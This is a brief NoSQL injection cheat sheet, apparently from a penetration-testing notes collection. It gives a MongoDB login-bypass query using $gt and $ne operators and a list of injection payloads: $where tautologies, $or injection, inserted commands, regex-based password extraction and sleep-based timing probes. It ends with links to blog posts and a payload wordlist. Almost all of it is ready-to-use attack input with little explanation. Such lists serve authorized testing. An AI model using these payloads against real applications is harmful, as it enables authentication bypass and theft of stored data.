# Nosql-injections

Nosql-databases like MongoDB is becoming more and more common. So this needs to be expanded.

## Login bypass

Basically change the query to this.

```javascript
{"user":{"$gt": ""},"pass":{"$gt": ""}}
username[$ne]=toto&password[$ne]=toto

```

## MongoDB Payloads

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';sleep(5000);'
';sleep(5000);+'
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

[http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html](http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)  
[http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html](http://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html)  
[https://github.com/cr0hn/nosqlinjection\_wordlists](https://github.com/cr0hn/nosqlinjection_wordlists)

